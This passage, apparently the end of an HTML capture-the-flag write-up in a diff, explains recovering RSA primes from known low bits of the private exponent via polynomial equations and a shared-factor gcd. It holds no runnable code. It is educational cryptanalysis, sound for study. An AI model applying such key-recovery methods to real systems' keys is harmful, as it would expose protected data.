+e * <span class="hljs-symbol">d0</span> = <span class="hljs-number">1</span> + k(<span class="hljs-built_in">N</span> − s + <span class="hljs-number">1</span>)  (<span class="hljs-built_in">mod</span> <span class="hljs-number">2</span>^<span class="hljs-number">1050</span>)
+
+p^<span class="hljs-number">2</span> - s * p + <span class="hljs-built_in">N</span> = <span class="hljs-number">0</span></code></pre><p>We can try all <code>k</code> to find <code>s</code> and <code>p</code>.
+Since <code>p</code> is only 700 bits, we don&#39;t need coppersmith to recover full <code>p</code>.</p>
+<p>For second and third one, there&#39;s a common factor (<code>r</code>) between those two <code>N</code>. We can calculate gcd to recover <code>r</code> and divide it, so the problem becomes same as the previous one.</p>
+<p>For the last one, we have to use a different polynomial:</p>
+<pre class="hljs"><code>s = (pq + q^<span class="hljs-number">2</span> - q)
+phi(N) = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>) * q = N - s
+
+e * d0 = <span class="hljs-number">1</span> + k(N − s)  (mod <span class="hljs-number">2</span>^<span class="hljs-number">1050</span>)
+
+q^<span class="hljs-number">3</span> - q^<span class="hljs-number">2</span> - s * q + N = <span class="hljs-number">0</span></code></pre><p>Solve that polynomial to recover q.</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
